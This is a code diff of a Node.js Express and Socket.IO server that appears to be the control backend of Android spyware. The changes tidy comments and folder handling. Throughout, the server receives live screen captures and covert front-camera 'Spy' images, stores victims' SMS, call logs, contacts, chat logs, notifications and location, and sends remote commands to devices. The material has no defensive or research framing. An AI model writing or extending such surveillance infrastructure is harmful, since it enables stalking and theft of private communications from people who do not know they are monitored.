@@ -46,7 +46,7 @@ let devicesStatus = {};
 
 // --- 2. FAST SOCKET LOGIC ---
 io.on('connection', (socket) => {
-    // console.log('🔌 New Connection:', socket.id); // Console spam kam karne ke liye comment kiya
+    // console.log('🔌 New Connection:', socket.id);
 
     socket.on('join', (roomID) => {
         socket.join(roomID);
@@ -55,7 +55,6 @@ io.on('connection', (socket) => {
 
     // Device -> Admin (Screen Share)
     socket.on('screen-data', (data) => {
-        // Volatile means agar packet drop ho jaye to retry mat karo (Video smooth chalegi)
         socket.volatile.to(data.room).emit('screen-data', data.image);
     });
 
@@ -74,28 +73,33 @@ app.get('/', (req, res) => {
 });
 
 // ==================================================
-//  ✅ INTELLIGENT UPLOAD SYSTEM (FOLDERS WALA)
+//  ✅ INTELLIGENT UPLOAD SYSTEM (UPDATED FOR TYPE)
 // ==================================================
 
 app.post('/api/upload-image', (req, res) => {
-    // 'type' parameter Android se aayega (e.g., "front_cam", "screen_capture")
+    // Android se teeno cheezein aayengi
     let { device_id, image_data, type } = req.body; 
     
     if (!device_id || !image_data) return res.status(400).json({ error: "No Data" });
 
     const id = device_id.toString().trim().toUpperCase();
     
-    // 🔥 LOGIC: Agar type hai to folder banao: ID/type
-    // Example: DEVICE123/front_cam/
-    // Agar type nahi hai (Gallery sync) to direct ID folder me jayega
-    let folderPath = type ? `${id}/${type}` : id;
+    // 🔥 LOGIC: Folder Selection
+    // Agar type "front_camera" hai to folder banega: DEVICE_ID/front_camera
+    // Agar type null hai (Gallery), to folder banega: DEVICE_ID
+    let folderPath = id;
+    
+    if (type && type !== "null" && type !== "") {
+        folderPath = `${id}/${type}`; // Sub-folder for Spy/Screen
+    }
 
+    // Base64 fix
     let base64Image = image_data.startsWith('data:image') ? image_data : "data:image/jpeg;base64," + image_data;
 
-    // Async Upload (Server block nahi karega)
+    // Cloudinary Upload
     cloudinary.uploader.upload(base64Image, 
         { 
-            folder: folderPath, // 🔥 Dynamic Folder Name
+            folder: folderPath, // ✅ Dynamic Folder Name here
             public_id: Date.now().toString(), 
             resource_type: "image", 
             width: 1280, 
@@ -108,7 +112,7 @@ app.post('/api/upload-image', (req, res) => {
                 return res.status(500).json({ error: "Upload Failed" });
             }
             
-            // Socket se Admin ko bata do ki nayi photo aayi hai (Real-time update)
+            // Socket se Admin ko bata do
             io.emit('new-file', { device_id: id, url: result.secure_url, type: type || 'gallery' });
             
             res.json({ status: "success", url: result.secure_url });
@@ -120,6 +124,8 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
     const id = req.params.device_id.toUpperCase();
     const next_cursor = req.query.next_cursor || null;
 
+    // By default ye root folder (Gallery) dikhayega
+    // Agar future me sub-folders dikhane hain to prefix change kar sakte ho
     cloudinary.api.resources({
         type: 'upload', prefix: id + "/", max_results: 20, next_cursor: next_cursor, direction: 'desc', context: true
     }, 
@@ -186,7 +192,6 @@ app.post('/api/send-command', (req, res) => {
     if (!devicesStatus[id]) devicesStatus[id] = { id: id, lastSeen: 0 };
     devicesStatus[id].command = command;
     
-    // Also emit via socket if connected (Instant Speed)
     io.to(id).emit('command', command);
     
     res.json({ status: "success", command: command });
@@ -196,7 +201,7 @@ app.post('/api/send-command', (req, res) => {
 //  🔥 FAST ASYNC DATA STORAGE (Non-Blocking)
 // ==================================================
 
-app.post('/api/upload_data', async (req, res) => { // ✅ Made Async
+app.post('/api/upload_data', async (req, res) => { 
     let { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
     
@@ -206,7 +211,7 @@ app.post('/api/upload_data', async (req, res) => { // ✅ Made Async
     try {
         let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
 
-        // Update Location in Memory (Fast Access)
+        // Update Location
         if (type === 'location') {
             const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
             if (locObj && (locObj.lat || locObj.latitude)) {
@@ -222,7 +227,6 @@ app.post('/api/upload_data', async (req, res) => { // ✅ Made Async
         if (['notifications', 'sms', 'call_logs', 'contacts', 'chat_logs'].includes(type)) {
             let existingData = [];
             
-            // ✅ Non-Blocking Read
             try {
                 const fileContent = await fs.promises.readFile(filePath, 'utf8');
                 existingData = JSON.parse(fileContent);
@@ -239,7 +243,6 @@ app.post('/api/upload_data', async (req, res) => { // ✅ Made Async
             }
         }
 
-        // ✅ Non-Blocking Write (Server Hang Nahi Hoga)
         await fs.promises.writeFile(filePath, JSON.stringify(finalData, null, 2));
         
         res.json({ status: "success" });
@@ -253,7 +256,6 @@ app.get('/api/get-data/:device_id/:type', async (req, res) => {
     const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
     try {
         if (fs.existsSync(filePath)) {
-            // Stream the file (Better for RAM)
             const readStream = fs.createReadStream(filePath);
             readStream.pipe(res);
         } else {
